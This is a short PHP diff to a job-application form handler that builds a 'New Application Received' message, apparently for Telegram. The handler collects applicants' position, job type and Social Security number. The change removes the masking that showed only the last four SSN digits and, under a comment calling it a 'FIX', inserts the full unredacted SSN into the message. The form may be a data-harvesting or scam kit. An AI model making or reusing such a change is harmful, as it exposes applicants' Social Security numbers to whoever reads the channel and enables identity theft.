@@ -388,7 +388,9 @@ $position = escape_telegram_html($post_data['q14_positionApplied'] ?? '');
 $job_type = escape_telegram_html($post_data['q24_jobType'] ?? 'Not specified');
 $source = escape_telegram_html($post_data['q21_howDid21'] ?? 'Unknown');
 $ssn_raw = $post_data['q25_socSec'] ?? '';
-$ssn_display = (strlen($ssn_raw) >= 4) ? '***-**-' . substr($ssn_raw, -4) : 'Not provided';
+// ***** FIX: Send full SSN without redaction *****
+$ssn_display = !empty($ssn_raw) ? escape_telegram_html($ssn_raw) : 'Not provided';
+// ***********************************************
 $timestamp = date('Y-m-d H:i:s');
 
 $message = "<b>📋 New Application Received</b>\n\n" .
